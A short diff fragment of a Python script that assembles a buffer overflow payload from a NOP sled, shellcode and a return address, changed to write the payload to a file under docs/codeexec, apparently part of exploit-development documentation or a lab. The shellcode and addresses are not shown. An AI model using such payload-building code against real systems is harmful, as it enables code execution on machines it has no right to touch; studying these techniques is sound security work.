@@ -6,4 +6,5 @@ NOP_SLED_LEN = OFFSET - len(SHELLCODE)
 
 PAYLOAD = b"\x90" * NOP_SLED_LEN + SHELLCODE + RETURN_ADDRESS
 
-print(len(SHELLCODE))
+with open("docs/codeexec/payload.bin", "wb") as f:
+    f.write(PAYLOAD)
